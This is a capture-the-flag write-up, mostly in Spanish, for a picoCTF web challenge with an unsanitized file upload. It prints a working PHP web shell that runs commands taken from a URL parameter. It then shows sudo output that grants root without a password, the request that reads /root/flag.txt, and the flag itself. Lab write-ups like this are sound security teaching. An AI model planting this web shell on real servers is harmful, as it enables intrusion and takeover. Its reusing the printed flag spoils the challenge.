## Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:63831/)!

## Hint

1. File upload was not sanitized
2.  Whenever you get a shell on a remote machine, check `sudo -l`

## Solution

Como es carga de archivos, lo primero que se piensa es hacer una revershell con php para cargarla Por suerte tenia una, que me daba hasta interfas de usuario

```html
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```

A partir de ahi empezamos a ejecutar comando, ejecutamos un sudo -l para ver que podemos ejecutar sin necesidad de contraseña, y nos da el siguiente resultado

```java
Matching Defaults entries for www-data on challenge:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User www-data may run the following commands on challenge:  
(ALL) NOPASSWD: ALL
```

Lo que nos muestra que podemos ejecutar todo como root sin necesidad de contraseña, por lo que ejecutamos un cat a la bandera, que ya sabemos que es flag.txt

```
http://standard-pizzas.picoctf.net:53362/uploads/scrypt5.php?cmd=sudo%20cat%20/root/flag.txt

liga: picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
```

### Tags
